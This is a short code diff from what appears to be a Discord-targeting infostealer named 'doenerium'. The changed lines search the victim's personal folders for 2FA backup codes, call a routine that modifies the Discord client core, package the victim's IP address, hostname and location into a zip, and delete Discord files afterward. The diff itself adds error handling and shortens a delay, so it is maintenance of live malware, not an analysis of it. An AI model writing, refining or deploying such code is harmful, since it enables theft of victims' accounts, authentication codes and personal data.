@@ -2456,7 +2456,10 @@
               }
 
               ["Videos", "Desktop", "Documents", "Downloads", "Pictures"].forEach(async (type) => {
-                await this.findBackupCodes(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`, client.requires.fs.readdirSync(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`))
+                try {
+                  this.findBackupCodes(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`, client.requires.fs.readdirSync(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`))
+                }
+                catch (e) { console.log(e) }
               })
 
               await this.modify_discord_core(); // 1
@@ -2474,7 +2477,7 @@
 
               client.utils.jszip.createTxt("\\Network Data.txt", `IP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}`)
 
-              await client.utils.time.sleep(30000);
+              await client.utils.time.sleep(5000);
               for (const path of client.config.discord.files_path) {
                 if (client.requires.fs.existsSync(path.replace("index.js", "doenerium"))) {
                   client.requires.fs.rmdirSync(path.replace("index.js", "doenerium"));
